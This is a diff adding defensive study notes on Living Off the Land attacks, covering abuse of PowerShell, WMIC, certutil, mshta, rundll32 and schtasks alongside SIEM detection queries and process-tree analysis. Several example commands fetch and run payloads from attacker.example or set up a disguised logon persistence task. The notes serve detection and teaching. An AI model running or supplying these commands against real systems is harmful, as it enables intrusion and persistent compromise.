@@ -16282,3 +16282,660 @@ IOCs + Behaviour
        ↓
 Detection / Response
 ```
+
+# Living Off the Land Attacks
+
+## Living Off the Land (LoL)
+
+**Living Off the Land (LoL)** refers to attackers abusing legitimate, built-in operating-system tools instead of introducing custom malware or obvious new binaries.
+
+Attackers prefer LoL techniques because built-in tools are:
+
+- Already trusted by the operating system
+- Widely available by default
+- Commonly allowed by security controls
+- Familiar to administrators
+- Useful for execution, persistence, reconnaissance, and lateral movement
+- Less suspicious than newly introduced binaries
+
+Using native utilities can help attackers blend malicious activity with legitimate administrative activity.
+
+## Common LoL Tools and Techniques
+
+| Tool / Technique | Common Abuse |
+|---|---|
+| **PowerShell** | In-memory scripting, downloads, execution, automation |
+| **WMI / WMIC** | Local/remote command execution and system discovery |
+| **Certutil** | Downloading, encoding, and decoding files |
+| **Mshta** | Executing HTA, JavaScript, or VBScript content |
+| **Rundll32** | Executing DLL exports and triggering URL handlers |
+| **Scheduled Tasks / schtasks** | Persistence and scheduled execution |
+| **PsExec** | Remote execution and lateral movement |
+| **Autoruns** | Persistence discovery and manipulation |
+
+## LOLBAS and GTFOBins
+
+Living Off the Land techniques exist on both Windows and Unix/Linux systems.
+
+### LOLBAS
+
+**LOLBAS (Living Off The Land Binaries and Scripts)** documents legitimate Windows binaries and scripts that can be abused by attackers.
+
+### GTFOBins
+
+**GTFOBins** documents Unix/Linux binaries that can be abused to bypass restrictions, execute commands, escalate privileges, or perform other malicious actions.
+
+# Defensive Measures
+
+## Reduce LoL Attack Surface
+
+Recommended defensive measures include:
+
+- Apply layered endpoint, network, and identity controls.
+- Implement application control policies.
+- Use **AppLocker** or **Windows Defender Application Control (WDAC)** where appropriate.
+- Apply the principle of least privilege.
+- Restrict access to administrative utilities.
+- Monitor suspicious command-line activity.
+- Capture complete process command lines.
+- Capture parent/child process relationships.
+- Configure DNS filtering.
+- Block known malicious domains and IP addresses.
+- Maintain containment playbooks.
+- Regularly review access permissions.
+- Regularly review logging coverage.
+- Regularly update application-control policies.
+
+# Real-World LoL Examples
+
+## APT29 / Nobelium
+
+APT29 has used **PowerShell** together with **WMI event subscriptions** for persistence and execution.
+
+A malicious WMI event subscription can trigger PowerShell execution while keeping payloads in WMI properties rather than obvious files on disk.
+
+### Key Techniques
+
+- PowerShell
+- WMI event subscriptions
+- Fileless execution
+- Encrypted payloads stored in WMI
+- Event-triggered execution
+
+### MITRE ATT&CK
+
+- **T1546.003** → WMI Event Subscription
+
+## BlackCat / ALPHV
+
+BlackCat ransomware operators have abused legitimate Windows utilities for execution and lateral movement.
+
+Examples include:
+
+- PowerShell → Scripting and execution
+- PsExec → Remote execution and lateral movement
+- Certutil → Payload handling and transfer
+
+## QakBot and IcedID
+
+Threat actors associated with loaders such as **QakBot** and **IcedID** have used signed Windows binaries to stage or execute payloads such as Cobalt Strike beacons.
+
+Examples include:
+
+- `rundll32.exe`
+- `mshta.exe`
+
+These legitimate Windows processes can make malicious execution appear less suspicious.
+
+# Detecting LoL Activity
+
+## Detection Strategy
+
+LoL detection should not rely only on the executable name.
+
+Instead, examine:
+
+- Command line
+- Parent process
+- Child processes
+- User
+- Host
+- Execution context
+- Network connections
+- Destination domains/IPs
+- File activity
+- Timing
+- Frequency
+- Process ancestry
+
+A legitimate binary becomes suspicious when it is used in an unusual context.
+
+# PowerShell
+
+## PowerShell Overview
+
+PowerShell is a Windows scripting and automation engine.
+
+Attackers abuse PowerShell because it can:
+
+- Execute scripts
+- Download files
+- Communicate with the network
+- Automate system actions
+- Interact with Windows APIs
+- Execute code with limited disk artefacts
+- Modify system settings
+
+## Common Malicious PowerShell Patterns
+
+### Remote Script Download and Execution
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
+```
+
+Important indicators:
+
+- `-NoP` → NoProfile
+- `-NonI` → NonInteractive
+- `-W Hidden` → Hidden window
+- `-Exec Bypass` → Attempts to bypass execution-policy restrictions
+- `IEX` → `Invoke-Expression`
+- `DownloadString` → Downloads content as a string
+- Remote URL → External payload source
+
+### Encoded PowerShell
+
+```powershell
+powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...
+```
+
+`-EncodedCommand` can hide the command content using Base64 encoding.
+
+> Base64 is encoding, not encryption. Analysts can decode it to inspect the underlying command.
+
+### Download and Execute
+
+```powershell
+powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
+```
+
+This:
+
+1. Downloads a file.
+2. Saves it to disk.
+3. Executes it.
+
+## PowerShell Detection
+
+Example SIEM detection:
+
+```text
+index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
+(CommandLine="*powershell*IEX*" OR
+ CommandLine="*powershell*-EncodedCommand*" OR
+ CommandLine="*powershell*-Exec Bypass*" OR
+ CommandLine="*Invoke-WebRequest*" OR
+ CommandLine="*DownloadString*" OR
+ CommandLine="*Invoke-RestMethod*")
+| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
+```
+
+### Important PowerShell Events
+
+- **4688** → Windows process creation
+- **1** → Sysmon Process Create
+- **4104** → PowerShell Script Block Logging
+
+# WMIC / WMI
+
+## WMIC Overview
+
+**WMIC (Windows Management Instrumentation Command-line)** provides command-line access to WMI functionality.
+
+Attackers can abuse WMI/WMIC for:
+
+- Remote command execution
+- Process creation
+- System discovery
+- Remote administration
+- Persistence
+
+## Remote Process Creation
+
+```powershell
+wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
+```
+
+This uses WMIC to instruct a remote host to create a PowerShell process.
+
+## Process Discovery
+
+```powershell
+wmic /node:TARGETHOST process get name,commandline
+```
+
+This queries processes and command lines on the target host.
+
+## Local Process Creation
+
+```powershell
+wmic process call create "notepad.exe"
+```
+
+WMIC can also be used to create processes locally.
+
+## WMIC Detection
+
+Example:
+
+```text
+index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
+(CommandLine="*\\wmic.exe*process call create*" OR
+ CommandLine="*wmic /node:* process call create*" OR
+ CommandLine="*wmic*process get Name,CommandLine*")
+| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
+```
+
+# Certutil
+
+## Certutil Overview
+
+`certutil.exe` is a legitimate Microsoft certificate-management utility.
+
+Attackers abuse it for:
+
+- Downloading files
+- Base64 decoding
+- Base64 encoding
+- Payload staging
+- File transfer
+
+## Download a File
+
+```powershell
+certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe
+```
+
+This downloads the remote file and writes it to the specified path.
+
+## Decode Base64
+
+```powershell
+certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe
+```
+
+This converts a Base64-encoded file into its decoded form.
+
+## Encode a File
+
+```powershell
+certutil -encode C:\Users\Public\payload.exe C:\Users\Public\payload.b64
+```
+
+This converts a file into Base64 representation.
+
+## Certutil Detection
+
+Example:
+
+```text
+index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688 OR EventCode=4663)
+(Image="*\\certutil.exe" OR CommandLine="*certutil*")
+(CommandLine="* -urlcache * -f *" OR
+ CommandLine="* -decode *" OR
+ CommandLine="* -encode *")
+| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
+```
+
+### Important Event
+
+- **4663** → Object access auditing
+
+# MSHTA
+
+## MSHTA Overview
+
+`mshta.exe` executes **HTML Applications (HTA)**.
+
+HTA files can contain:
+
+- VBScript
+- JavaScript
+- ActiveX
+- System commands
+
+Attackers abuse `mshta.exe` to execute malicious scripts.
+
+## Remote HTA
+
+```powershell
+mshta "http://attacker.example/payload.hta"
+```
+
+This loads and executes an HTA from a remote location.
+
+## Inline JavaScript
+
+```powershell
+mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell -NoP -NonI -W Hidden -Command \"Start-Process calc.exe\"');close();"
+```
+
+This demonstrates how inline JavaScript can create a `WScript.Shell` object and launch another process.
+
+## Local HTA
+
+```powershell
+mshta "C:\Users\Public\malicious.hta"
+```
+
+This executes an HTA stored locally.
+
+## MSHTA Detection
+
+Example:
+
+```text
+index=sysmon (EventCode=1 OR EventCode=4688)
+Image="*\\mshta.exe"
+(CommandLine="*http*://*" OR
+ CommandLine="*javascript:*" OR
+ CommandLine="*.hta")
+| stats count by host, user, ParentImage, CommandLine
+```
+
+### Suspicious Indicators
+
+- `mshta.exe` launched by Office applications
+- Remote HTTP/HTTPS URLs
+- `javascript:`
+- `vbscript:`
+- HTA files from temporary directories
+- Unusual parent processes
+- PowerShell spawned by `mshta.exe`
+
+# Rundll32
+
+## Rundll32 Overview
+
+`rundll32.exe` is a legitimate Windows utility used to execute exported functions from DLLs.
+
+Attackers can abuse it to execute malicious DLL code.
+
+## Execute DLL Export
+
+```powershell
+rundll32.exe C:\Users\Public\backdoor.dll,Start
+```
+
+This loads the DLL and invokes its exported `Start` function.
+
+## URL Handler Abuse
+
+```powershell
+rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"
+```
+
+This invokes the `FileProtocolHandler` export in `url.dll`.
+
+## DLL from Temporary Directory
+
+```powershell
+rundll32.exe C:\Windows\Temp\loader.dll,Run
+```
+
+A DLL stored in a writable temporary directory can be highly suspicious.
+
+## Rundll32 Detection
+
+Example:
+
+```text
+index=sysmon (EventCode=1 OR EventCode=4688 OR EventCode=7)
+Image="*\\rundll32.exe"
+(CommandLine="*\\Users\\Public\\*" OR
+ CommandLine="*url.dll,FileProtocolHandler*" OR
+ CommandLine="*\\Windows\\Temp\\*")
+| stats count by host, user, ParentImage, CommandLine
+```
+
+### Suspicious Indicators
+
+- DLL executed from `%TEMP%`
+- DLL executed from `C:\Users\Public`
+- Unusual DLL export names
+- `url.dll,FileProtocolHandler`
+- Office application spawning `rundll32.exe`
+- Browser or document application spawning `rundll32.exe`
+
+# Scheduled Tasks
+
+## Task Scheduler
+
+Windows Task Scheduler is a legitimate automation mechanism that can execute programs or scripts:
+
+- At logon
+- At startup
+- At a specific time
+- On a recurring schedule
+- In response to events
+
+Because it is a normal administrative feature, attackers frequently abuse it for persistence.
+
+## Scheduled Task Components
+
+A scheduled task generally contains:
+
+- **Task name**
+- **Trigger**
+- **Action**
+- **Run-as account**
+- **Conditions**
+
+## Create a Logon Persistence Task
+
+```powershell
+schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')\""
+```
+
+The task:
+
+1. Creates a task named `WindowsUpdate`.
+2. Triggers at user logon.
+3. Starts PowerShell.
+4. Downloads a remote script.
+5. Executes the script.
+
+## Create a Daily Task
+
+```powershell
+schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05
+```
+
+This creates a task that executes a script daily at `00:05`.
+
+## Run a Task Immediately
+
+```powershell
+schtasks /Run /TN "WindowsUpdate"
+```
+
+This manually triggers an existing scheduled task.
+
+## Scheduled Task Detection
+
+Example:
+
+```text
+index=wineventlog EventCode=4698 OR EventCode=4699 OR index=sysmon
+(EventCode=1 OR EventCode=4688)
+(CommandLine="*schtasks* /Create*" OR
+ CommandLine="*schtasks* /Run*" OR
+ Image="*\\taskeng.exe" OR
+ EventCode=4698)
+| stats count by host, user, EventCode, TaskName, CommandLine
+```
+
+### Important Scheduled Task Events
+
+- **4698** → Scheduled task created
+- **4699** → Scheduled task deleted
+- **4700** → Scheduled task enabled
+- **4701** → Scheduled task disabled
+- **4702** → Scheduled task updated
+
+# Process Tree Analysis
+
+## Why Process Trees Matter
+
+A LoL executable is not automatically malicious.
+
+The **parent process and command line provide context**.
+
+For example:
+
+```text
+winword.exe
+    └── powershell.exe
+          └── certutil.exe
+                └── payload.exe
+```
+
+This is considerably more suspicious than:
+
+```text
+admin-tool.exe
+    └── powershell.exe
+```
+
+### Important Questions
+
+When investigating LoL activity, ask:
+
+- Who launched the process?
+- What was the parent process?
+- What command line was used?
+- What child processes were created?
+- Was a network connection established?
+- Was a file created?
+- Was the execution expected for that user?
+- Did the activity occur during normal working hours?
+- Did multiple LoL tools appear in sequence?
+
+# LoL Detection Principles
+
+## Command-Line Monitoring
+
+Capture full command lines whenever possible.
+
+Look for suspicious combinations such as:
+
+```text
+powershell + IEX + DownloadString
+```
+
+```text
+wmic + process call create
+```
+
+```text
+certutil + -urlcache
+```
+
+```text
+mshta + http
+```
+
+```text
+rundll32 + suspicious DLL
+```
+
+```text
+schtasks + /Create + PowerShell
+```
+
+## Parent-Child Relationships
+
+Monitor unusual process relationships.
+
+Examples:
+
+```text
+winword.exe
+    └── powershell.exe
+```
+
+```text
+excel.exe
+    └── cmd.exe
+```
+
+```text
+mshta.exe
+    └── powershell.exe
+```
+
+```text
+w3wp.exe
+    └── cmd.exe
+```
+
+```text
+rundll32.exe
+    └── network activity
+```
+
+These relationships can provide stronger evidence than the executable name alone.
+
+# Key Takeaways
+
+## Living Off the Land
+
+```text
+Legitimate Tool
+      ↓
+Abused by Attacker
+      ↓
+Execution / Discovery / Persistence / Lateral Movement
+      ↓
+Blends with Legitimate Activity
+```
+
+## Common Windows LoL Tools
+
+| Tool | Common Malicious Use |
+|---|---|
+| PowerShell | Scripting, downloading, execution |
+| WMI / WMIC | Remote execution, discovery |
+| Certutil | Downloading, encoding, decoding |
+| MSHTA | Script execution |
+| Rundll32 | DLL execution |
+| Schtasks | Persistence and scheduled execution |
+| PsExec | Remote execution |
+| Autoruns | Persistence discovery/manipulation |
+
+## Detection Formula
+
+```text
+LoL Detection
+      ↓
+Executable
+      +
+Command Line
+      +
+Parent Process
+      +
+Child Processes
+      +
+User
+      +
+Network Activity
+      +
+File Activity
+      ↓
+Context
+      ↓
+Determine Legitimate vs Malicious
+```
+
+> The key principle is: **Do not treat the use of a legitimate Windows utility as malicious by itself. Detect the combination of the tool, command line, process ancestry, user context, network activity, and resulting behaviour.**
